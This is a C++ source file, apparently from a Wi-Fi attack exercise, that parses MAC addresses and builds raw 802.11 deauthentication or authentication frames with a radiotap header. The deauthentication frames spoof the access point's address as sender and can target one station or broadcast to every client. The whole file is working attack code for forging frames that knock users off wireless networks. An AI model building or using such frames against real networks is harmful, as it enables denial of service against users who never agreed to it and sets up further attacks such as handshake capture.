#include "AttackFrame.h"
#include <cstdio>
#include <cstring>

// parseMac 구현
bool parseMac(const std::string& str, MacAddr& mac) {
    uint8_t tmp[6];
    int res = sscanf(str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                     &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    if (res != 6) return false;
    mac = MacAddr(tmp);
    return true;
}

// buildMgmtFrame 구현
bool buildMgmtFrame(
    uint8_t* packetBuf,
    int& packetLen,
    const MacAddr& apMac,
    const MacAddr& stMac,
    bool isDeauth,
    bool isBroadcast)
{
    // 1) Radiotap
    RadioTapHdr* rth = reinterpret_cast<RadioTapHdr*>(packetBuf);
    rth->revision = 0;
    rth->pad = 0;
    rth->length = sizeof(RadioTapHdr); // 8
    rth->presentFlags = 0;
    int offset = sizeof(RadioTapHdr);

    // 2) Dot11Hdr (24바이트)
    Dot11Hdr* dot11 = reinterpret_cast<Dot11Hdr*>(packetBuf + offset);
    memset(dot11, 0, sizeof(Dot11Hdr));

    // deauth => 0xC0, auth => 0xB0
    uint16_t subtype = (isDeauth ? FC_SUBTYPE_DEAUTH : FC_SUBTYPE_AUTH);
    dot11->frameControl = subtype; // 리틀엔디안 주의, 여기선 단순 대입
    dot11->duration = 0;

    // addr1
    if (isBroadcast) {
        memset(dot11->addr1, 0xFF, 6); // ff:ff:ff:ff:ff:ff
    } else {
        memcpy(dot11->addr1, stMac.data(), 6);
    }
    // addr2, addr3 => AP
    memcpy(dot11->addr2, apMac.data(), 6);
    memcpy(dot11->addr3, apMac.data(), 6);

    offset += sizeof(Dot11Hdr);

    // 3) Fixed fields
    if (isDeauth) {
        // reason code
        DeauthFixed* df = reinterpret_cast<DeauthFixed*>(packetBuf + offset);
        df->reasonCode = 0x0007; // example reason code
        offset += sizeof(DeauthFixed);
    } else {
        // auth => AuthFixed
        AuthFixed* af = reinterpret_cast<AuthFixed*>(packetBuf + offset);
        af->authAlgorithm = 0x0000; // Open System
        af->authSeq       = 0x0001;
        af->statusCode    = 0x0000;
        offset += sizeof(AuthFixed);
    }

    packetLen = offset;
    return true;
}
